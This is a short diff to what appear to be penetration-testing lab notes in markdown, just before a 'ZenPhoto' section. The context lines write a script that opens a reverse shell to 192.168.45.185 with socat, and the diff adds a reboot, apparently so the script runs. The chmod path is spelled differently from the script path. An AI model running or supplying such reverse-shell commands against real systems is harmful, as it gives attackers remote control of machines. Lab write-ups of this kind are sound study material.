@@ -295,6 +295,7 @@ cat <<'EOT'> /home/cmeeks/reverse.sh
 socat TCP:192.168.45.185:80 EXEC:sh 
 EOT
 chmod +x /home/cmmeks/reverse.sh
+reboot
 
 ```
 ### ZenPhoto
